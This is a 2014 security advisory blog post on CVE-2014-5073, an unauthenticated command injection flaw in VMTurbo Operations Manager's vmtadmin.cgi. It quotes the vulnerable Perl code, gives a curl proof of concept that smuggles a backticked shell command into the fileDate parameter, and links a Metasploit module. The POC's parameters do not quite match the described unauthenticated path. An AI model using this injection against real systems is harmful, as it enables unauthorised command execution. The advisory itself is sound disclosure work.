---
comments: true
date: 2014-07-30 23:58:30
layout: post
slug: 2014-07-30-vmturbo-operation-manager-remote-command-execution
title: VMTurbo Operations Manager vmtadmin.cgi Remote Command Execution
categories:
- Security
- Vulnerabilities
- Web Apps
tags:
- CVE-2014-5073
- advisory
- vmturbo
- pentesting
- security
- vulnerability
- rce
- cgi
- command execution 
---

[VMTurbo Operations Manager](http://vmturbo.com/product/operations-management-software/) is an appliance for the virtual machine management and can be exploite to compromise a vulnerable system due to an unauthenticated remote command execution vulnerability. 

Certain CGI scripts exposed by the Operation Manager web interface do not properly sanitized before being used to execute system command. This vulnerability can be exploited to inject and execute arbitrary shell commands with privileges of the "wwwrun" user.

The vulnerability affects VMTurbo Operations Manager versions prior to 4.6-28657.

## Vulnerability 

The affected CGI `cgi-bin/vmtadmin.cgi` is a Perl script used to execute certain administrative tasks, depending on the parameters `callType` and `actionType`.

```perl

my $actiontype = $query->param("actionType");
my $calltype = $query->param("callType");
my $filedate = $query->param("fileDate");

my $statusfile = (defined $filedate) ? $filedate : $mon.".".$mday.".".$year.".".$hour.$min.".".$actiontype.".vmturbo.txt";

# ...
if ( $calltype eq "READ" ) {
        # ...
}
# ...
elsif ($calltype eq "ACTION" ) {
        if ( $actiontype eq "EXPORTBACKUP" ) {
                &authenticate;
                # ...
		}
		# ...
}
elseif ($calltype eq "DOWN") {
        if ( $actiontype eq "CFGBACKUP" ) {
                # Cfg download
                # TODO: Check if missing (should not be possible, as we just created it)
                open(DLFILE, "</tmp/vmtbackup.zip");
                @fileholder = <DLFILE>;
                close (DLFILE);
                # remove the log file as we dont need it
                # Allow at least one read of the logs first
                sleep(1);
                system("rm \"$upload_dir$statusfile\"");
                print "Content-Type:application/zip\n";
                print "Content-Disposition:attachment;filename=vmtbackup.zip\n\n";
                print @fileholder;
        }
		# ...
}
```

While most of the available actions call the `authenticate()` function to authenticate the request, the actions available when `callType` is set to `DOWN` are not protected by the authentication check. Moreover, some of these actions call the Perl function `system()` passing as parameter the unsanitized user input.

## POC

The exploitation is blind and the command execution output is not returned to the HTTP request. We can obviusly use some time-based command to verify the vulnerabilty:

```bash
$ time curl "http://192.168.0.149/cgi-bin/vmtadmin.cgi?callType=ACTION&actionType=DOWN&fileDate=`sleep 10`"
real	0m10.114s
user	0m0.010s
sys     0m0.009s
$
```

The curl request returns after 10 seconds due to the `sleep 10` command executed on the vulnerable system.

## METASPLOIT MODULE

Find the metasploit module [vmturbo_vmtadmin_exec_noauth.rb](https://github.com/epinna/advisories/blob/master/CVE-2014-5073/vmturbo_vmtadmin_exec_noauth.rb) in my Github [Advisories](https://github.com/epinna/advisories) repository and find below a quick example of how it works.

<script type="text/javascript" src="https://asciinema.org/a/11176.js" id="asciicast-11176" async></script>

## REFERENCES

The [advisory](http://secunia.com/secunia_research/2014-8/) has been originally published by Emilio Pinna, Secunia Resarch.

Secunia has assigned the advisory id [SA58880](http://secunia.com/advisories/58880)

The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2014-5073](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5073) to the vulnerability.

## DISCLOSURE

16/06/2014 - Request for Security contact.
17/06/2014 - Vendor reply with contact details.
19/06/2014 – Vendor notified with vulnerability details.
01/07/2014 - Preliminary release date adjusted to 14th July, 2014.
18/07/2014 – Vendor provides KB article.
25/07/2014 – Public disclosure.

